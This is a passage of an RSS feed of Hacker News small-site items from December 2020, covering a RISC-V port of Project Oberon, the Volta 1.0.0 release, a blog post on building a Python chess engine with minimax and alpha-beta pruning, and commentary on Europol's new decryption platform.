the same traps:</p><ul role="list"><li>Providing a smooth interface, with zero transparency into whatâ€™s happening under the hood, killing reproducibility and auditing.</li><li>Solving one part of the stack well, like training, but â€œbolting onâ€ under-developed solutions for other parts, like deployment.</li><li>Locking data scientists and machine learning engineers into a narrow stack by only supporting specific frameworks and integrations.</li></ul><p>The result is a platform that makes production machine learning easyâ€”if you stay strictly within the confines of the system. When you have a diverse set of problems to solve, however, this is difficult to do.</p><p>Metaflow and Cortex represent a fundamentally different, human-centric approach. The emphasis is not on providing a magic solution to a narrow set of problems, but on providing an easy interface for building solutions to any problem.</p><p>If youâ€™re interested in digging into either platform, check out the links below:</p><ul role="list"><li><strong>Metaflow documentation: </strong> <a href="https://docs.metaflow.org/" target="_blank">https://docs.metaflow.org/</a></li><li><strong>Metaflow GitHub: </strong><a href="https://github.com/Netflix/metaflow" target="_blank">https://github.com/Netflix/metaflow</a></li><li><strong>Cortex documentation: </strong><a href="https://docs.cortex.dev/" target="_blank">https://docs.cortex.dev/</a></li><li><strong>Cortex GitHub: </strong><a href="https://github.com/cortexlabs/cortex" target="_blank">https://github.com/cortexlabs/cortex</a></li></ul><p>â€</p></div></div>]]>
            </description>
            <link>https://www.cortex.dev/post/reproducible-machine-learning-pipelines-with-metaflow-and-cortex</link>
            <guid isPermaLink="false">hacker-news-small-sites-25497008</guid>
            <pubDate>Mon, 21 Dec 2020 17:20:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Project Oberon 2013 on RISC-V]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25496993">thread link</a>) | @homarp
<br/>
December 21, 2020 | http://lists.inf.ethz.ch/pipermail/oberon/2020/015269.html | <a href="https://web.archive.org/web/*/http://lists.inf.ethz.ch/pipermail/oberon/2020/015269.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
   
    <b>Rikke SolbjÃ¸rg</b> 
    <a href="mailto:oberon%40lists.inf.ethz.ch?Subject=Re:%20Re%3A%20%5BOberon%5D%20Project%20Oberon%202013%20on%20RISC-V&amp;In-Reply-To=%3CCAGsQOdE4PTnJS8dqpkpV6zroT8wR%2BWzRRn3yNMwqv_cfP0dcSg%40mail.gmail.com%3E" title="[Oberon] Project Oberon 2013 on RISC-V">rikke.solbjorg at gmail.com
       </a><br>
    <i>Sun Dec 20 17:54:17 CET 2020</i>
    <ul>
        <li>Previous message: <a href="http://lists.inf.ethz.ch/pipermail/oberon/2020/015281.html">[Oberon] simple arcade games (Oleg N. Cher)
</a></li>
        <li>Next message: <a href="http://lists.inf.ethz.ch/pipermail/oberon/2020/015270.html">[Oberon] Project Oberon 2013 on RISC-V
</a></li>
         <li> <b>Messages sorted by:</b> 
              <a href="http://lists.inf.ethz.ch/pipermail/oberon/2020/date.html#15269">[ date ]</a>
              <a href="http://lists.inf.ethz.ch/pipermail/oberon/2020/thread.html#15269">[ thread ]</a>
              <a href="http://lists.inf.ethz.ch/pipermail/oberon/2020/subject.html#15269">[ subject ]</a>
              <a href="http://lists.inf.ethz.ch/pipermail/oberon/2020/author.html#15269">[ author ]</a>
         </li>
       </ul>
    <hr>  
<!--beginarticle-->
<pre>Hi,

I saw your recent discussion on running Project Oberon on RISC-V. I've been
working on a RISC-V port for the last few months, which might be
interesting to you. A port of Project Oberon to RISC-V (i.e. a RV32IM
compiler and a port of the rest of the system), as well as an emulator that
can run it, can be found in these repositories:

<a href="https://github.com/solbjorg/oberon-riscv">https://github.com/solbjorg/oberon-riscv</a>
<a href="https://github.com/solbjorg/oberon-riscv-emu">https://github.com/solbjorg/oberon-riscv-emu</a>

If you just want to try it, there's a disk image included with the emulator.

To my knowledge, this RISC-V port is more complete than others that I have
found: the compiler can compile the Oberon system as well as itself, and
the system runs well in the emulator. It lacks support for REALs and
interrupts at the moment, but most programs are able to run without them.

The port is built on top of several other Oberon-related projects, which
I've credited in oberon-riscv's readme.

I'm planning to make it run on an FPGA in the future too, although that
will have to come after the holidays.

Kind regards,
Rikke
-------------- next part --------------
An HTML attachment was scrubbed...
URL: &lt;<a href="http://lists.inf.ethz.ch/pipermail/oberon/attachments/20201220/2aa09666/attachment.html">http://lists.inf.ethz.ch/pipermail/oberon/attachments/20201220/2aa09666/attachment.html</a>&gt;
</pre>









<!--endarticle-->
    <hr>
    <ul>
        <!--threads-->
	<li>Previous message: <a href="http://lists.inf.ethz.ch/pipermail/oberon/2020/015281.html">[Oberon] simple arcade games (Oleg N. Cher)
</a></li>
	<li>Next message: <a href="http://lists.inf.ethz.ch/pipermail/oberon/2020/015270.html">[Oberon] Project Oberon 2013 on RISC-V
</a></li>
         <li> <b>Messages sorted by:</b> 
              <a href="http://lists.inf.ethz.ch/pipermail/oberon/2020/date.html#15269">[ date ]</a>
              <a href="http://lists.inf.ethz.ch/pipermail/oberon/2020/thread.html#15269">[ thread ]</a>
              <a href="http://lists.inf.ethz.ch/pipermail/oberon/2020/subject.html#15269">[ subject ]</a>
              <a href="http://lists.inf.ethz.ch/pipermail/oberon/2020/author.html#15269">[ author ]</a>
         </li>
       </ul>

<hr>
<a href="https://lists.inf.ethz.ch/mailman/listinfo/oberon">More information about the Oberon
mailing list</a><br>

</div>]]>
            </description>
            <link>http://lists.inf.ethz.ch/pipermail/oberon/2020/015269.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25496993</guid>
            <pubDate>Mon, 21 Dec 2020 17:18:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Volta â€“ The Hassle-Free JavaScript Tool Manager â€“ Hits 1.0.0]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25496900">thread link</a>) | @charlespierce
<br/>
December 21, 2020 | https://blog.volta.sh/2020/12/21/announcing-volta-100/ | <a href="https://web.archive.org/web/*/https://blog.volta.sh/2020/12/21/announcing-volta-100/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>The Volta team is thrilled to announce that Volta 1.0.0 is now available! Volta is a fast, reliable utility for declaring your JavaScript <a href="http://calculist.org/blog/2020/12/21/tac/">Toolchains as Code</a>. In much the same way that Infrastructure as Code frees teams from manually managing their server infrastructure, <strong>Volta takes the hassle out of installing and coordinating JavaScript tools</strong>â€”such as Node, package managers, and package binariesâ€”so that you can focus on creating awesome software.
<!--more--></p>



<p>The 1.0.0 release means that Volta is ready for general use in projects of all sizes. The new features included in version 1.0.0 are the last pieces in a string of workâ€”begun with Volta 0.9.0â€”to make the most common tools work seamlessly with the benefits that Volta provides.</p>

<p>At the same time, 1.0.0 means more than, â€œwe implemented some high-impact functionality and finally closed some long-standing issues.â€ From the beginning, Volta was built to empower engineers and engineering teams to build amazing JS applications without having to worry about their environment or tooling. For individual engineers, Volta unobtrusively makes sure your tooling is aligned with the needs of your project, allowing you to stay focused on your work. For engineering teams, Volta allows you to manage your infrastructure decision-making centrally without slowing down individual team members. When the team decides to change versions of Node, for example, that doesnâ€™t require explicit effort on the part of each developer. With version 1.0.0, we believe Volta delivers on the promise of making tool management disappear.</p>

<p>Last, version 1.0.0 represents a commitment to stability. As we continue to add new features and support for more tools, we are committed to doing so in a backwards-compatible way. You can be confident that new releases wonâ€™t break your workflows or scripts.</p>



<h2 id="support-for-npm-link">Support for <code>npm link</code></h2>

<p>With the <a href="https://blog.volta.sh/2020/10/22/announcing-volta-090/">release of Volta 0.9.0</a>, we added support for installing tools directly with your package manager while still taking advantage of the benefits that Volta provides. We have extended that support to include linking your local packages with <code>npm link</code>, even across different npm versions. Additionally, if you try to link two projects that are using different Node versions, Volta will alert you that there might be incompatibilities that cause unexpected behavior.</p>

<h2 id="support-for-upgrading-global-packages">Support for upgrading global packages</h2>

<p>You can now upgrade your installed global packages directly with your package manager, using <code>npm update -g</code> or <code>yarn global upgrade</code>. Volta will make sure that the package manager can locate all of the packages so that they can be upgraded to their latest versions.</p>



<p>While we believe that Volta 1.0.0 achieves the goals for the project, that doesnâ€™t mean that we are done! Active development will continue on Volta: adding new features, support for new tools, and fixing any bugs that crop up. A few items on our near-term roadmap include:</p>

<ul>
  <li>Native builds for Apple M1 devices</li>
  <li>Support for using <a href="https://pnpm.js.org/"><code>pnpm</code></a> as your package manager</li>
  <li>Improvements to <code>volta list</code>, making it easier to visualize the state of your tools</li>
</ul>



<p>To try Volta for the first time or upgrade your existing installation, follow the instructions on our <a href="https://docs.volta.sh/guide/getting-started">Getting Started</a> page!</p>

<p>Finally, this release is the culmination of more than two years of work from a whole host of contributors. It wouldnâ€™t have been possible without all of your ideas, feedback, bug reports, code, and encouragement. We would like to extend our heartfelt thanks to everyone in the community for your support.</p>

<p><em>Interested in getting involved? Join our <a href="https://discord.gg/hgPTz9A">Discord server</a>!</em></p>

        </div></div>]]>
            </description>
            <link>https://blog.volta.sh/2020/12/21/announcing-volta-100/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25496900</guid>
            <pubDate>Mon, 21 Dec 2020 17:10:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building My Own Chess Engine]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25496809">thread link</a>) | @healeycodes
<br/>
December 21, 2020 | https://healeycodes.com/building-my-own-chess-engine/ | <a href="https://web.archive.org/web/*/https://healeycodes.com/building-my-own-chess-engine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>December 20, 2020<!-- --> in<!-- --> <span><a href="https://healeycodes.com/tags/python">Python</a></span></p></header><section><p>I have been learning chess (again) and how to program a chess engine (for the first time) over the last month. After skimming some introductory texts, I was convinced that building a simple chess engine â€” one that would put up a fair fight against a casual player â€” would take no more than a few days.</p>
<p>I was wrong.</p>
<p>But I made it there in the end and created a toy chess engine (<a href="https://github.com/healeycodes/andoma">healeycodes/andoma</a>) that I am proud of. It can play a game of chess and solve simple chess puzzles like mate-in-two or mate-in-three. It has a slim UCI interface which means it can be hooked up to lichess.org via <a href="https://github.com/ShailChoksi/lichess-bot">lichess-bot</a> â€” a bridge between the lichess API and chess bots.</p>
<p>The first speed bump in its development was grasping the computational the complexity of chess â€” how fast, and wide, the search tree grows. When a chess game starts, white can open in twenty different ways and black can respond in twenty different ways also. After the first full turn, there are 400 variations possible. After the third full turn, there are <a href="https://en.wikipedia.org/wiki/Shannon_number#Shannon's_calculation">over 119 million</a>.</p>
<p>Claude Shannon calculated that there are around <code>10^120</code> possible games of chess in his seminal paper <em>Programming a Computer for Playing Chess</em> in 1950. In <em>Rage Against the Machines</em>, Nate Silver <a href="https://fivethirtyeight.com/features/rage-against-the-machines/">quotes</a> Diego Rasskin-Gutman, who said:</p>
<blockquote>
<p>There are more possible chess games than the number of atoms in the universe.</p>
</blockquote>
<p>Given unlimited resources, it actually doesnâ€™t take many lines of code to calculate every legal variation of chess. Here, the Python package <a href="https://python-chess.readthedocs.io/en/latest/">python-chess</a> is used for board representation and legal move generation.</p>
<div data-language="python"><pre><code><span>from</span> chess <span>import</span> Board<span>,</span> Move<span>,</span> STARTING_FEN


positions <span>=</span> <span>{</span><span>}</span>


<span>def</span> <span>generate_tree</span><span>(</span>fen<span>)</span><span>:</span>
    board <span>=</span> Board<span>(</span>fen<span>)</span>
    legal_moves <span>=</span> <span>list</span><span>(</span>board<span>.</span>legal_moves<span>)</span>
    <span>if</span> fen <span>in</span> positions<span>:</span>
        positions<span>[</span>fen<span>]</span> <span>+=</span> legal_moves
    <span>else</span><span>:</span>
        positions<span>[</span>fen<span>]</span> <span>=</span> legal_moves

    <span>for</span> move <span>in</span> legal_moves<span>:</span>
        board<span>.</span>push<span>(</span>move<span>)</span>
        next_fen <span>=</span> board<span>.</span>fen<span>(</span><span>)</span>
        board<span>.</span>pop<span>(</span><span>)</span>
        
        generate_tree<span>(</span>next_fen<span>)</span>

<span>try</span><span>:</span>
    generate_tree<span>(</span>STARTING_FEN<span>)</span>
<span>except</span> RecursionError<span>:</span> 
    <span>print</span><span>(</span><span>len</span><span>(</span>positions<span>)</span> <span>+</span> <span>sum</span><span>(</span><span>len</span><span>(</span>p<span>)</span> <span>for</span> p <span>in</span> positions<span>)</span><span>)</span></code></pre></div>
<p>This program throws a <code>RecursionError</code> and prints <code>59691</code> â€” the number of different positions the search tree contained when it crashed. All we need to fix this, is another universe to run the program in.</p>
<p>Given that there are computational limits to abide by, as well as the time control rules of chess, improvements over a naive brute force search must be made.</p>
<h2 id="evaluation"><a href="#evaluation" aria-label="evaluation permalink"></a>Evaluation</h2>
<p>In order to search for good positions, it is necessary to understand what makes a good position <em>good</em>. The most simplistic way of describing a positionâ€™s strength is to compare the total value material of each side.</p>
<p>Tomasz Michniewski, author of the <a href="https://www.chessprogramming.org/Simplified_Evaluation_Function">Simplified Evaluation Function</a>, defined some values that are â€œdesigned specifically to compensate for the lack of any other chess knowledgeâ€. This is perfect for me â€” a beginner chess player.</p>
<p>This snippet sums the material on the initial board using Michniewskiâ€™s piece values.</p>
<div data-language="python"><pre><code><span>import</span> chess

piece_values <span>=</span> <span>{</span>
    chess<span>.</span>PAWN<span>:</span> <span>100</span><span>,</span>
    chess<span>.</span>ROOK<span>:</span> <span>500</span><span>,</span>
    chess<span>.</span>KNIGHT<span>:</span> <span>320</span><span>,</span>
    chess<span>.</span>BISHOP<span>:</span> <span>330</span><span>,</span>
    chess<span>.</span>QUEEN<span>:</span> <span>900</span><span>,</span>
    chess<span>.</span>KING<span>:</span> <span>20000</span>
<span>}</span>

board <span>=</span> chess<span>.</span>Board<span>(</span>chess<span>.</span>STARTING_FEN<span>)</span>
white_material <span>=</span> <span>0</span>
black_material <span>=</span> <span>0</span>

<span>for</span> square <span>in</span> chess<span>.</span>SQUARES<span>:</span>
    piece <span>=</span> board<span>.</span>piece_at<span>(</span>square<span>)</span>
    <span>if</span> <span>not</span> piece<span>:</span>
        <span>continue</span>
    <span>if</span> piece<span>.</span>color <span>==</span> chess<span>.</span>WHITE<span>:</span>
        white_material <span>+=</span> piece_values<span>[</span>piece<span>.</span>piece_type<span>]</span>
    <span>else</span><span>:</span>
        black_material <span>+=</span> piece_values<span>[</span>piece<span>.</span>piece_type<span>]</span></code></pre></div>
<p>Michniewski also provides <a href="https://www.chessprogramming.org/Piece-Square_Tables">piece-square tables</a>, which alter the value of a piece depending on which square it sits on. For example, itâ€™s better for pawns to progress up the board and itâ€™s better for knights to be near the center of the board.</p>
<p>The bonus of a square may be positive, neutral, or negative. The piece-square tables are presented from Whiteâ€™s POV and must be mirrored for Black.</p>
<div data-language="text"><pre><code># a knight's bonuses depending on square
-50,-40,-30,-30,-30,-30,-40,-50,
-40,-20,  0,  0,  0,  0,-20,-40,
-30,  0, 10, 15, 15, 10,  0,-30,
-30,  5, 15, 20, 20, 15,  5,-30,
-30,  0, 15, 20, 20, 15,  0,-30,
-30,  5, 10, 15, 15, 10,  5,-30,
-40,-20,  0,  5,  5,  0,-20,-40,
-50,-40,-30,-30,-30,-30,-40,-50,</code></pre></div>
<p>For the king, Michniewski provides two tables â€” one for the middle game and one for the end game. He defines the end game as being either if:</p>
<blockquote>
<p>Both sides have no queens or</p>
</blockquote>
<blockquote>
<p>Every side which has a queen has additionally no other pieces or one minorpiece maximum.</p>
</blockquote>

<p>The evaluation of a chess board is one of the things thatâ€™s kept me interested in chess engines. Evaluation rules are easy to add and take away. I refactored the code from Go to Python to be able to prototype different rules faster.</p>
<p>After piece-square tables, one might look at pawn structure, mobility, center control, connectivity, trapped pieces, king safety, space, tempo, and other patterns (this list is taken from the Chess Programming Wikiâ€™s <a href="https://www.chessprogramming.org/Evaluation">Evaluation</a> page).</p>
<h2 id="searching-with-minimax"><a href="#searching-with-minimax" aria-label="searching with minimax permalink"></a>Searching With Minimax</h2>
<p><a href="https://en.wikipedia.org/wiki/Minimax">Minimax</a> is a search algorithm that finds the next optimal move by minimizing the potential loss in a worst case scenario. Chess is a game of perfect information â€” by looking at the board itâ€™s possible to know exactly what an opponent is capable of. However, this search for moves is limited by the evaluation function and the depth that computing resources are able to reach.</p>
<p>The search space is a tree of legal moves which grows exponentially at every level (the average branching factor is around 35). By the time the tree is explored, the path to many future boards is known as well as which path restricts the opponentâ€™s possible gains the most.</p>
<p>The leaf nodes of the tree return the evaluation of their current state. Non-leaf nodes inherit their value from a descendant node. Eventually, the recursive function reduces down to a value for the given board.</p>
<p>This function can be used to pick the next best move by calling it on every legal move available in the current turn. A great visual resource for this algorithm is Sebastian Lagueâ€™s <a href="https://www.youtube.com/watch?v=l-hh51ncgDI">Algorithms Explained â€“ minimax and alpha-beta pruning</a>.</p>
<div data-language="python"><pre><code><span>def</span> <span>minimax</span><span>(</span>board<span>,</span> depth<span>,</span> maximizing_player<span>)</span><span>:</span>
    <span>if</span> depth <span>==</span> <span>0</span> <span>or</span> board<span>.</span>is_game_over<span>(</span><span>)</span><span>:</span>
        <span>return</span> evaluate<span>(</span>board<span>)</span>
    <span>if</span> maximizing_player<span>:</span>
        value <span>=</span> <span>-</span><span>float</span><span>(</span><span>'inf'</span><span>)</span>
        <span>for</span> move <span>in</span> board<span>.</span>legal_moves<span>:</span>
            board<span>.</span>push<span>(</span>move<span>)</span>
            value <span>=</span> <span>max</span><span>(</span>value<span>,</span> minimax<span>(</span>board<span>,</span> depth <span>-</span> <span>1</span><span>,</span> <span>False</span><span>)</span><span>)</span>
            board<span>.</span>pop<span>(</span><span>)</span>
	    <span>return</span> value
    <span>else</span><span>:</span>
        value <span>=</span> <span>float</span><span>(</span><span>'inf'</span><span>)</span>
        <span>for</span> move <span>in</span> board<span>.</span>legal_moves<span>:</span>
            board<span>.</span>push<span>(</span>move<span>)</span>
            value <span>=</span> <span>min</span><span>(</span>value<span>,</span> minimax<span>(</span>board<span>,</span> depth <span>-</span> <span>1</span><span>,</span> <span>True</span><span>)</span><span>)</span>
            board<span>.</span>pop<span>(</span><span>)</span>
        <span>return</span> value</code></pre></div>
<h2 id="alpha-beta-pruning"><a href="#alpha-beta-pruning" aria-label="alpha beta pruning permalink"></a>Alpha-beta pruning</h2>
<p>My chess engine uses <a href="https://en.wikipedia.org/wiki/Alpha%E2%80%93beta_pruning">alpha-beta pruning</a> as an improvement over the naive minimax algorithm â€” which does not fare well against the exponential nature of chess. Branches of the search tree can be eliminated when it is clear that another branch shows more promise. This significantly reduces the number of moves required to be generated.</p>
<p><span>
      <a href="https://healeycodes.com/static/a99200aacf6d6cfc643aaa45317d65aa/42a19/alpha-beta-pruning.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Branches of a minimax search tree being stopped early" title="Branches of a minimax search tree being stopped early" src="https://healeycodes.com/static/a99200aacf6d6cfc643aaa45317d65aa/42a19/alpha-beta-pruning.png" srcset="https://healeycodes.com/static/a99200aacf6d6cfc643aaa45317d65aa/a8a0d/alpha-beta-pruning.png 300w,
https://healeycodes.com/static/a99200aacf6d6cfc643aaa45317d65aa/dface/alpha-beta-pruning.png 600w,
https://healeycodes.com/static/a99200aacf6d6cfc643aaa45317d65aa/42a19/alpha-beta-pruning.png 1024w" sizes="(max-width: 1024px) 100vw, 1024px" loading="lazy">
  </a>
    </span></p>
<p>By reducing the depth of branches that will not bear fruit we can search deeper down the better parts of the tree.</p>
<p>The speed of alpha-beta pruning can be increased by applying <a href="https://www.chessprogramming.org/Move_Ordering">move ordering</a>. This is where the more promising branches of the search tree are searched first â€” which means less time is spent in the worst branches as they will be cut off early.</p>
<p>Move ordering cannot be 100% accurate but itâ€™s a powerful optimization.</p>
<p>In <a href="https://github.com/healeycodes/andoma">my engine</a>, a cheap (but not perfect) <code>move_value</code> function is used to sort the initial legal move nodes from best to worst. The logic of this function is capture in its docstring:</p>
<div data-language="python"><pre><code><span>'''
How good is a move?
A promotion is great.
A weaker piece taking a stronger piece is good.
A stronger piece taking a weaker piece is bad.
Also consider the position change via piece-square table.
'''</span></code></pre></div>
<h2 id="communication-and-the-uci-protocol"><a href="#communication-and-the-uci-protocol" aria-label="communication and the uci protocol permalink"></a>Communication and the UCI Protocol</h2>
<p>The <a href="https://github.com/healeycodes/andoma/blob/main/uci-interface.md">Universal Chess Interface</a> (UCI) is a open protocol to hook up chess engines to user interfaces. The communication is done through standard input and standard output and messages end with <code>\n</code>. The move format is long algebraic notation â€” like <code>e2e4</code>, or <code>e1g1</code> for white short castling, and an example of a promotion to queen is <code>a7a8q</code>.</p>
<p>There are many configuration commands in the specification and it initially seemed overwhelming. After debugging, I found that not many were required to get a chess engine to the <em>Hello World</em> stage.</p>
<p>In order to hook my chess engine up to lichess via <a href="https://github.com/ShailChoksi/lichess-bot">lichess-bot</a>, I implemented the following. These commands are send to the engine from lichess-bot:</p>
<ul>
<li><code>uci</code> - the engine reports its name, authors, and <code>uciok</code></li>
<li><code>isready</code> - the engine reports that itâ€™s ready: <code>readyok</code></li>
<li><code>position startpos moves e2e4</code> - the engine sets itâ€™s internal state to match the list of moves</li>
<li><code>go</code> - the engine should now calculate and respond with the next best move, like <code>g8f6</code></li>
</ul>
<h2 id="a-promise"><a href="#a-promise" aria-label="a promise permalink"></a>A Promise</h2>
<p>I have found a great joy interacting with the chess community over the last month. Lichess is a fantastic resource and endlessly fun to play on. The UI is slick and light â€” and the post-match analysis is revealing and simple to use. Itâ€™s <a href="https://github.com/ornicar/lila">open source</a> and relies on donations and sponsorships.</p>
<p>I took breaks from writing this article to play chess against Dad on a real board. Weâ€™re missing a white rook and use a pencil sharpener as a replacement piece. He has been telling me stories about playing chess decades ago â€” before IBMâ€™s <a href="https://en.wikipedia.org/wiki/Deep_Blue_(chess_computer)">Deep Blue</a> emerged and beat Garry Kasparov, the reigning world champion, on its second attempt in 1997.</p>
<p>If you are within my social circle, you will have experienced me evangelizing chess and chess engines over the last month â€” now that I have published this, I promise to chill out a little bit â™Ÿï¸</p>
<h2 id="other-resources"><a href="#other-resources" aria-label="other resources permalink"></a>Other Resources</h2>
<p>To build <a href="https://github.com/healeycodes/andoma">healeycodes/andoma</a>, I used the following resources (and recommend all of them).</p>
<ul>
<li><a href="https://www.chessprogramming.org/Main_Page">Chess Programming Wiki</a> â€” an incredible wealth of knowledge exists here. I spent hours reading through intermediate and advanced concepts just for fun</li>
<li><a href="https://www.youtube.com/watch?v=l-hh51ncgDI">Algorithms Explained â€“ minimax and alpha-beta pruning</a> â€” Sebastian Lagueâ€™s breakdowns â€¦</li></ul></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://healeycodes.com/building-my-own-chess-engine/">https://healeycodes.com/building-my-own-chess-engine/</a></em></p>]]>
            </description>
            <link>https://healeycodes.com/building-my-own-chess-engine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25496809</guid>
            <pubDate>Mon, 21 Dec 2020 17:03:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[EU's new Decryption Platform to tackle the challenge of encrypted material]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25496787">thread link</a>) | @DyslexicAtheist
<br/>
December 21, 2020 | https://alecmuffett.com/article/13075 | <a href="https://web.archive.org/web/*/https://alecmuffett.com/article/13075">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-13075">
		<!-- .entry-header -->

	
	<div>
		
<p>So, this <a href="https://www.europol.europa.eu/newsroom/news/europol-and-european-commission-inaugurate-new-decryption-platform-to-tackle-challenge-of-encrypted-material-for-law-enforcement">press release</a> just dropped:</p>



<hr>



<blockquote><p>This week Europol launched an innovative decryption platform, developed in close cooperation with the&nbsp;<a rel="noreferrer noopener" href="https://ec.europa.eu/info/departments/joint-research-centre_en" target="_blank">European Commissionâ€™s Joint Research Centre</a>. It will significantly increase Europolâ€™s capability to decrypt information lawfully obtained in criminal investigations.</p><p>The launch of the new decryption platform marks a milestone in the fight against organised crime and terrorism in Europe. In full respect of fundamental rights and without limiting or weakening encryption, this initiative will be available to national law enforcement authorities of all Member States to help keep societies and citizens safe and secure. A virtual inauguration ceremony brought together senior representatives from Europol, the&nbsp;<a rel="noreferrer noopener" href="https://www.europarl.europa.eu/portal/en" target="_blank">European Parliament</a>, the&nbsp;<a rel="noreferrer noopener" href="https://www.consilium.europa.eu/en/" target="_blank">Council of the EU</a>&nbsp;and the&nbsp;<a rel="noreferrer noopener" href="https://ec.europa.eu/info/index_en" target="_blank">Commission</a>.</p><cite><a href="https://www.europol.europa.eu/newsroom/news/europol-and-european-commission-inaugurate-new-decryption-platform-to-tackle-challenge-of-encrypted-material-for-law-enforcement">https://www.europol.europa.eu/newsroom/news/europol-and-european-commission-inaugurate-new-decryption-platform-to-tackle-challenge-of-encrypted-material-for-law-enforcement</a></cite></blockquote>



<hr>



<p>Now my gut reaction when anyone refers to â€œthe launch of a new platformâ€ with glowing descriptions and prescriptive outlook, is to remember Geoffrey Jamesâ€™ â€œTao of Programmingâ€ â€“ but this is more important than mere nerd flippancy, and so worthy of some deeper consideration. </p>



<p>The announcement continues:</p>



<hr>



<blockquote><p>Europolâ€™s&nbsp;<a href="https://www.europol.europa.eu/about-europol/european-cybercrime-centre-ec3">European Cybercrime Centre (EC3)</a>&nbsp;will operate the platform and leverage its in-house expertise in providing the most effective support to national Member State investigations.</p><cite>q.v.</cite></blockquote>



<hr>



<p>â€¦which links to a <a href="https://www.europol.europa.eu/about-europol/european-cybercrime-centre-ec3">fairly terrifying page</a>, with some particularly egregious military-code-word-security-cyber-spooky-stuff:</p>



<hr>



<figure><img data-attachment-id="13078" data-permalink="https://alecmuffett.com/article/13075/organigram_2020_just-titles" data-orig-file="https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles.jpg" data-orig-size="1191,635" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="organigram_2020_just-titles" data-image-description="" data-medium-file="https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles-300x160.jpg" data-large-file="https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles-1024x546.jpg" loading="lazy" width="1024" height="546" src="https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles-1024x546.jpg" alt="" srcset="https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles-1024x546.jpg 1024w, https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles-300x160.jpg 300w, https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles-150x80.jpg 150w, https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles-768x409.jpg 768w, https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles.jpg 1191w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px" data-lazy-srcset="https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles-1024x546.jpg 1024w, https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles-300x160.jpg 300w, https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles-150x80.jpg 150w, https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles-768x409.jpg 768w, https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles.jpg 1191w" data-lazy-src="https://alecmuffett.com/wp-content/uploads/2020/12/organigram_2020_just-titles-1024x546.jpg?is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>What the hell is â€œAP CYBORGâ€? And â€¦ â€œTWINSâ€? Ick.</figcaption></figure>



<hr>



<p>So, basically, this sounds something along the lines of <em>â€œwe bought a whole pile of GPUs and/or rented them from somewhere, and weâ€™re announcing it before Christmas so that people know that we are <strong>â€˜doing something about cyberâ„¢â€™</strong>â€œ</em></p>



<p>But why would that be interesting? Why announce something? And why now?</p>



<p><strong>Gut feeling</strong>, followed by a <strong>wild, unsubstantiated guess</strong>: this is not a capability which one would normally announce. Stuff like this is very nerdy, and best kept in-house. Therefore it is being announced for a â€œsoft goalâ€, done for the sake of being seen to be done. </p>



<p>Whatâ€™s a good soft goal? Well, based upon my corporate (rather than Government) experience, there are two obvious options:</p>



<ol><li>â€œWe have budget that we have to spend, and which we have to be seen to be spending, so that we can get the same or increased budget, next yearâ€; or, more interestinglyâ€¦</li><li>Someone with an ounce of sense regarding strategic face-saving, is looking at all the European Commission-led brouhaha regarding <a href="https://www.consilium.europa.eu/en/press/press-releases/2020/12/14/encryption-council-adopts-resolution-on-security-through-encryption-and-security-despite-encryption/">â€œWe need to have good security IN SPITE of good security, oh, wait, did I say security? I meant â€˜encryptionâ€™, of courseâ€</a> â€“ and  is announcing this in order to have a face-saving programme in the (likely? I hope likely) instance that all of that political sound and fury, comes to nothing.</li></ol>



<p>Number 2 is particularly interesting to me because the European Commission is called-out on the press release headline; I canâ€™t imagine that as happening on a more mundane, geek- or budget-led press release. Hence thinking that the EC want to be seen to be taking a diversity of approaches towards encryption. </p>



<p>Maybe I am wrong, so perhaps someone who knows more about the operations of Europol press releases, can comment? Anonymously, via Strong Encryption and Tor, if desired?</p>



<hr>



<p>[1] This:</p>



